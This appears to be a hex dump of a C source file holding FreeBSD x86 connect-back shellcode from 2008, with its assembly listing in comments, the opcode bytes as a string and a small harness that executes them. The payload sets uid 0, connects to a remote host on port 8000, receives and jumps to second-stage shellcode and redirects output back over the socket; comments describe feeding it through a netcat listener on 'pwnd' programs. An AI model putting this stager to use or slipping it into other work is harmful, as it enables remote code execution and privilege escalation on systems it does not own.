00000000  2f 2a 0d 0a 3b 20 73 6d  34 78 20 2d 20 32 30 30  |/*..; sm4x - 200|
00000010  38 0d 0a 3b 20 72 65 76  65 72 73 65 20 63 6f 6e  |8..; reverse con|
00000020  6e 65 63 74 20 64 6c 28  73 68 65 6c 6c 63 6f 64  |nect dl(shellcod|
00000030  65 29 20 61 6e 64 20 65  78 65 63 75 74 65 2c 20  |e) and execute, |
00000040  65 78 69 74 0d 0a 3b 20  20 2d 20 69 27 76 65 20  |exit..;  - i've |
00000050  75 73 65 64 20 74 68 69  73 20 74 6f 20 66 65 65  |used this to fee|
00000060  64 20 70 77 6e 64 20 70  72 6f 67 73 20 68 75 67  |d pwnd progs hug|
00000070  65 20 6d 65 73 73 79 20  73 68 65 6c 6c 63 6f 64  |e messy shellcod|
00000080  65 20 72 65 74 27 69 6e  67 20 74 68 65 20 72 65  |e ret'ing the re|
00000090  73 75 6c 74 73 20 6f 76  65 72 20 6e 63 20 3b 29  |sults over nc ;)|
000000a0  0d 0a 3b 20 20 2d 20 66  65 65 64 20 69 74 20 77  |..;  - feed it w|
000000b0  69 74 68 20 61 20 24 6e  63 20 2d 76 76 6c 20 2d  |ith a $nc -vvl -|
000000c0  70 38 30 30 30 20 3c 73  68 65 6c 6c 63 6f 64 65  |p8000 <shellcode|
000000d0  5f 69 6e 5f 66 69 6c 65  0d 0a 3b 20 73 65 74 75  |_in_file..; setu|
000000e0  69 64 28 30 29 3b 20 73  6f 63 6b 65 74 28 29 3b  |id(0); socket();|
000000f0  20 63 6f 6e 6e 65 63 74  28 29 3b 20 64 75 70 73  | connect(); dups|
00000100  28 29 3b 20 72 65 63 76  28 29 3b 20 6a 6d 70 3b  |(); recv(); jmp;|
00000110  20 65 78 69 74 28 29 3b  0d 0a 3b 20 39 30 20 62  | exit();..; 90 b|
00000120  79 74 65 73 20 28 4e 55  4c 4c 20 66 72 65 65 20  |ytes (NULL free |
00000130  64 65 70 20 6f 6e 20 72  65 6d 6f 74 65 20 61 64  |dep on remote ad|
00000140  64 72 65 73 73 29 0d 0a  3b 20 46 72 65 65 42 53  |dress)..; FreeBS|
00000150  44 20 37 2e 30 2d 52 45  4c 45 41 53 45 0d 0a 0d  |D 7.0-RELEASE...|
00000160  0a 67 6c 6f 62 61 6c 20  5f 73 74 61 72 74 0d 0a  |.global _start..|
00000170  5f 73 74 61 72 74 3a 0d  0a 0d 0a 78 6f 72 20 20  |_start:....xor  |
00000180  20 20 20 65 61 78 2c 20  65 61 78 0d 0a 0d 0a 3b  |   eax, eax....;|
00000190  20 2d 2d 2d 20 73 65 74  75 69 64 28 30 29 0d 0a  | --- setuid(0)..|
000001a0  70 75 73 68 20 20 20 20  65 61 78 0d 0a 70 75 73  |push    eax..pus|
000001b0  68 20 20 20 20 65 61 78  0d 0a 6d 6f 76 20 20 20  |h    eax..mov   |
000001c0  20 20 61 6c 2c 20 30 78  31 37 0d 0a 70 75 73 68  |  al, 0x17..push|
000001d0  20 20 20 20 65 61 78 0d  0a 69 6e 74 20 20 20 20  |    eax..int    |
000001e0  20 30 78 38 30 0d 0a 0d  0a 3b 20 2d 2d 2d 20 73  | 0x80....; --- s|
000001f0  6f 63 6b 65 74 28 29 0d  0a 70 75 73 68 20 20 20  |ocket()..push   |
00000200  20 65 61 78 0d 0a 70 75  73 68 20 20 20 20 62 79  | eax..push    by|
00000210  74 65 20 30 78 30 31 0d  0a 70 75 73 68 20 20 20  |te 0x01..push   |
00000220  20 62 79 74 65 20 30 78  30 32 0d 0a 6d 6f 76 20  | byte 0x02..mov |
00000230  20 20 20 20 61 6c 2c 20  30 78 36 31 0d 0a 70 75  |    al, 0x61..pu|
00000240  73 68 20 20 20 20 65 61  78 0d 0a 69 6e 74 20 20  |sh    eax..int  |
00000250  20 20 20 30 78 38 30 0d  0a 6d 6f 76 20 20 20 20  |   0x80..mov    |
00000260  20 65 64 78 2c 20 65 61  78 0d 0a 0d 0a 3b 20 2d  | edx, eax....; -|
00000270  2d 2d 20 73 6f 63 6b 61  64 64 72 5f 69 6e 20 73  |-- sockaddr_in s|
00000280  65 74 75 70 0d 0a 70 75  73 68 20 20 20 20 30 78  |etup..push    0x|
00000290  39 30 30 31 31 61 63 20  20 20 20 20 20 3b 20 68  |90011ac      ; h|
000002a0  6f 73 74 20 31 37 32 2e  31 37 2e 30 2e 39 20 28  |ost 172.17.0.9 (|
000002b0  2e 30 2e 20 69 73 20 61  20 4e 55 4c 4c 29 0d 0a  |.0. is a NULL)..|
000002c0  70 75 73 68 20 20 20 20  30 78 34 30 31 66 30 32  |push    0x401f02|
000002d0  41 41 20 20 20 20 20 3b  20 70 6f 72 74 20 38 30  |AA     ; port 80|
000002e0  30 30 0d 0a 6d 6f 76 20  20 20 20 20 65 61 78 2c  |00..mov     eax,|
000002f0  20 65 73 70 0d 0a 0d 0a  3b 20 2d 2d 2d 20 73 65  | esp....; --- se|
00000300  74 75 70 20 63 6f 6e 6e  65 63 74 28 65 64 78 2c  |tup connect(edx,|
00000310  20 65 61 78 2c 20 30 78  31 30 29 3b 0d 0a 70 75  | eax, 0x10);..pu|
00000320  73 68 20 20 20 20 62 79  74 65 20 30 78 31 30 0d  |sh    byte 0x10.|
00000330  0a 70 75 73 68 20 20 20  20 65 61 78 0d 0a 70 75  |.push    eax..pu|
00000340  73 68 20 20 20 20 65 64  78 0d 0a 78 6f 72 20 20  |sh    edx..xor  |
00000350  20 20 20 65 61 78 2c 20  65 61 78 0d 0a 6d 6f 76  |   eax, eax..mov|
00000360  20 20 20 20 20 61 6c 2c  20 30 78 36 32 0d 0a 70  |     al, 0x62..p|
00000370  75 73 68 20 20 20 20 65  61 78 0d 0a 69 6e 74 20  |ush    eax..int |
00000380  20 20 20 20 30 78 38 30  0d 0a 6a 6e 65 20 20 20  |    0x80..jne   |
00000390  20 20 64 6f 6e 65 0d 0a  0d 0a 3b 20 2d 2d 2d 20  |  done....; --- |
000003a0  64 75 70 32 28 30 2b 31  2b 32 29 20 2d 20 72 65  |dup2(0+1+2) - re|
000003b0  6d 6f 76 65 20 69 66 20  79 6f 75 20 64 6f 6e 74  |move if you dont|
000003c0  20 77 61 6e 74 20 72 65  73 75 6c 74 73 20 73 65  | want results se|
000003d0  6e 74 20 6f 76 65 72 20  74 68 65 20 77 69 72 65  |nt over the wire|
000003e0  0d 0a 6d 6f 76 20 20 20  20 20 63 6c 2c 20 30 78  |..mov     cl, 0x|
000003f0  30 33 0d 0a 78 6f 72 20  20 20 20 20 65 62 78 2c  |03..xor     ebx,|
00000400  20 65 62 78 0d 0a 64 75  70 73 3a 0d 0a 70 75 73  | ebx..dups:..pus|
00000410  68 20 20 20 20 65 62 78  0d 0a 70 75 73 68 20 20  |h    ebx..push  |
00000420  20 20 65 64 78 0d 0a 6d  6f 76 20 20 20 20 20 61  |  edx..mov     a|
00000430  6c 2c 20 30 78 35 61 0d  0a 70 75 73 68 20 20 20  |l, 0x5a..push   |
00000440  20 65 61 78 0d 0a 69 6e  74 20 20 20 20 20 30 78  | eax..int     0x|
00000450  38 30 0d 0a 69 6e 63 20  20 20 20 20 65 62 78 0d  |80..inc     ebx.|
00000460  0a 6c 6f 6f 70 20 20 20  20 64 75 70 73 0d 0a 0d  |.loop    dups...|
00000470  0a 3b 20 2d 2d 2d 20 72  65 63 76 28 66 64 2c 20  |.; --- recv(fd, |
00000480  2a 62 75 66 2c 20 31 30  32 38 29 3b 0d 0a 78 6f  |*buf, 1028);..xo|
00000490  72 20 20 20 20 20 65 61  78 2c 20 65 61 78 0d 0a  |r     eax, eax..|
000004a0  70 75 73 68 20 20 20 20  77 6f 72 64 20 30 78 30  |push    word 0x0|
000004b0  34 30 34 20 20 20 20 20  20 3b 20 63 6f 6e 66 20  |404      ; conf |
000004c0  72 65 61 64 20 73 69 7a  65 20 68 65 72 65 0d 0a  |read size here..|
000004d0  6c 65 61 20 20 20 20 20  65 63 78 2c 20 5b 65 73  |lea     ecx, [es|
000004e0  70 2d 30 78 30 34 30 34  5d 20 3b 20 61 6e 64 20  |p-0x0404] ; and |
000004f0  68 65 72 65 0d 0a 70 75  73 68 20 20 20 20 65 63  |here..push    ec|
00000500  78 20 20 20 20 20 20 20  20 20 20 0d 0a 70 75 73  |x          ..pus|
00000510  68 20 20 20 20 65 64 78  0d 0a 6d 6f 76 20 20 20  |h    edx..mov   |
00000520  20 20 61 6c 2c 20 30 78  30 33 0d 0a 70 75 73 68  |  al, 0x03..push|
00000530  20 20 20 20 65 61 78 0d  0a 69 6e 74 20 20 20 20  |    eax..int    |
00000540  20 30 78 38 30 0d 0a 0d  0a 3b 20 2d 2d 2d 20 6a  | 0x80....; --- j|
00000550  6d 70 20 74 6f 20 72 65  63 76 20 73 68 65 6c 6c  |mp to recv shell|
00000560  63 6f 64 65 0d 0a 6a 6d  70 20 20 20 20 20 65 63  |code..jmp     ec|
00000570  78 20 20 20 20 20 20 20  20 20 20 3b 20 72 75 6e  |x          ; run|
00000580  20 73 68 65 6c 6c 63 6f  64 65 0d 0a 64 6f 6e 65  | shellcode..done|
00000590  3a 0d 0a 0d 0a 3b 20 2d  2d 2d 20 65 78 69 74 20  |:....; --- exit |
000005a0  28 6f 70 74 69 6f 6e 61  6c 20 2d 3e 20 70 6c 73  |(optional -> pls|
000005b0  20 65 78 69 74 20 66 72  6f 6d 20 6a 6d 70 20 73  | exit from jmp s|
000005c0  68 65 6c 6c 63 6f 64 65  29 0d 0a 78 6f 72 20 20  |hellcode)..xor  |
000005d0  20 20 20 65 61 78 2c 20  65 61 78 0d 0a 69 6e 63  |   eax, eax..inc|
000005e0  20 20 20 20 20 65 61 78  0d 0a 70 75 73 68 20 20  |     eax..push  |
000005f0  20 20 65 61 78 0d 0a 70  75 73 68 20 20 20 20 65  |  eax..push    e|
00000600  61 78 0d 0a 69 6e 74 20  20 20 20 20 30 78 38 30  |ax..int     0x80|
00000610  0d 0a 0d 0a 2a 2f 0d 0a  0d 0a 23 69 6e 63 6c 75  |....*/....#inclu|
00000620  64 65 20 3c 73 74 64 69  6f 2e 68 3e 0d 0a 23 69  |de <stdio.h>..#i|
00000630  6e 63 6c 75 64 65 20 3c  73 79 73 2f 73 6f 63 6b  |nclude <sys/sock|
00000640  65 74 2e 68 3e 0d 0a 23  69 6e 63 6c 75 64 65 20  |et.h>..#include |
00000650  3c 6e 65 74 69 6e 65 74  2f 69 6e 2e 68 3e 0d 0a  |<netinet/in.h>..|
00000660  0d 0a 63 68 61 72 20 63  6f 64 65 5b 5d 20 3d 20  |..char code[] = |
00000670  22 5c 78 33 31 5c 78 63  30 5c 78 35 30 5c 78 35  |"\x31\xc0\x50\x5|
00000680  30 5c 78 62 30 5c 78 31  37 5c 78 35 30 5c 78 63  |0\xb0\x17\x50\xc|
00000690  64 5c 78 38 30 5c 78 35  30 22 0d 0a 20 20 20 20  |d\x80\x50"..    |
000006a0  20 20 20 22 5c 78 36 61  5c 78 30 31 5c 78 36 61  |   "\x6a\x01\x6a|
000006b0  5c 78 30 32 5c 78 62 30  5c 78 36 31 5c 78 35 30  |\x02\xb0\x61\x50|
000006c0  5c 78 63 64 5c 78 38 30  5c 78 38 39 22 0d 0a 20  |\xcd\x80\x89".. |
000006d0  20 20 20 20 20 20 22 5c  78 63 32 5c 78 36 38 5c  |      "\xc2\x68\|
000006e0  78 61 63 5c 78 31 31 5c  78 30 30 5c 78 30 39 5c  |xac\x11\x00\x09\|
000006f0  78 36 38 5c 78 61 61 5c  78 30 32 5c 78 31 66 22  |x68\xaa\x02\x1f"|
00000700  0d 0a 20 20 20 20 20 20  20 22 5c 78 34 30 5c 78  |..       "\x40\x|
00000710  38 39 5c 78 65 30 5c 78  36 61 5c 78 31 30 5c 78  |89\xe0\x6a\x10\x|
00000720  35 30 5c 78 35 32 5c 78  33 31 5c 78 63 30 5c 78  |50\x52\x31\xc0\x|
00000730  62 30 22 0d 0a 20 20 20  20 20 20 20 22 5c 78 36  |b0"..       "\x6|
00000740  32 5c 78 35 30 5c 78 63  64 5c 78 38 30 5c 78 37  |2\x50\xcd\x80\x7|
00000750  35 5c 78 32 34 5c 78 62  31 5c 78 30 33 5c 78 33  |5\x24\xb1\x03\x3|
00000760  31 5c 78 64 62 22 0d 0a  20 20 20 20 20 20 20 22  |1\xdb"..       "|
00000770  5c 78 35 33 5c 78 35 32  5c 78 62 30 5c 78 35 61  |\x53\x52\xb0\x5a|
00000780  5c 78 35 30 5c 78 63 64  5c 78 38 30 5c 78 34 33  |\x50\xcd\x80\x43|
00000790  5c 78 65 32 5c 78 66 36  22 0d 0a 20 20 20 20 20  |\xe2\xf6"..     |
000007a0  20 20 22 5c 78 33 31 5c  78 63 30 5c 78 36 36 5c  |  "\x31\xc0\x66\|
000007b0  78 36 38 5c 78 30 34 5c  78 30 34 5c 78 38 64 5c  |x68\x04\x04\x8d\|
000007c0  78 38 63 5c 78 32 34 5c  78 66 63 22 0d 0a 20 20  |x8c\x24\xfc"..  |
000007d0  20 20 20 20 20 22 5c 78  66 62 5c 78 66 66 5c 78  |     "\xfb\xff\x|
000007e0  66 66 5c 78 35 31 5c 78  35 32 5c 78 62 30 5c 78  |ff\x51\x52\xb0\x|
000007f0  30 33 5c 78 35 30 5c 78  63 64 5c 78 38 30 22 0d  |03\x50\xcd\x80".|
00000800  0a 20 20 20 20 20 20 20  22 5c 78 66 66 5c 78 65  |.       "\xff\xe|
00000810  31 5c 78 33 31 5c 78 63  30 5c 78 34 30 5c 78 35  |1\x31\xc0\x40\x5|
00000820  30 5c 78 35 30 5c 78 63  64 5c 78 38 30 22 3b 0d  |0\x50\xcd\x80";.|
00000830  0a 0d 0a 69 6e 74 20 6d  61 69 6e 28 69 6e 74 20  |...int main(int |
00000840  61 72 67 63 2c 20 63 68  61 72 20 2a 2a 61 72 67  |argc, char **arg|
00000850  76 29 20 7b 20 20 20 20  20 20 20 0d 0a 20 69 6e  |v) {       .. in|
00000860  74 20 28 2a 66 75 6e 63  29 28 29 3b 0d 0a 20 70  |t (*func)();.. p|
00000870  72 69 6e 74 66 28 22 42  79 74 65 73 3a 20 25 64  |rintf("Bytes: %d|
00000880  5c 6e 22 2c 20 73 69 7a  65 6f 66 28 63 6f 64 65  |\n", sizeof(code|
00000890  29 29 3b 0d 0a 20 66 75  6e 63 20 3d 20 28 69 6e  |));.. func = (in|
000008a0  74 20 28 2a 29 28 29 29  20 63 6f 64 65 3b 0d 0a  |t (*)()) code;..|
000008b0  20 28 69 6e 74 29 28 2a  66 75 6e 63 29 28 29 3b  | (int)(*func)();|
000008c0  20 0d 0a 7d                                       | ..}|
000008c4
